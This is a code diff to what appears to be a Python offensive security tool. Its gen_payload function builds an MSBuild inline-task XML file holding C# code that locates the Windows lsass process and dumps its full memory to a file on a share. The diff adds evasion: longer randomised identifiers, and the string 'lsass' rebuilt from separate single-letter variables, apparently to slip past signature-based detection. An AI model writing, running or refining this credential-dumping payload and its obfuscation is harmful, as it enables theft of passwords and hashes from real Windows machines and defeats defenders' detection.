@@ -563,24 +563,27 @@ def do_ip(inpu): # check if the inputted ips are up so we dont scan thigns we do
     return uphosts
 
 def gen_payload(share_name, payload_name, drive_letter):
-    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
-    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
+    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 15)))
+    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
+    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
     xml_payload = r"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe SimpleTasks.csproj -->
@@ -641,7 +644,10 @@ public class %s : Task, ITask {
         }
 
         public static int %s() {
-            var %s = System.Diagnostics.Process.GetProcessesByName("lsass");
+            string %s = "s";
+            string %s = "l";
+            string %s = "a";
+            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);
             var %s = 0;
             foreach (var %s in %s)
             {
@@ -672,7 +678,7 @@ public class %s : Task, ITask {
                         </Code>
                 </Task>
         </UsingTask>
-</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, processes, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
+</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, s, l, a, processes, l, s, a, s, s, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
 
     with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
         f.write(xml_payload)
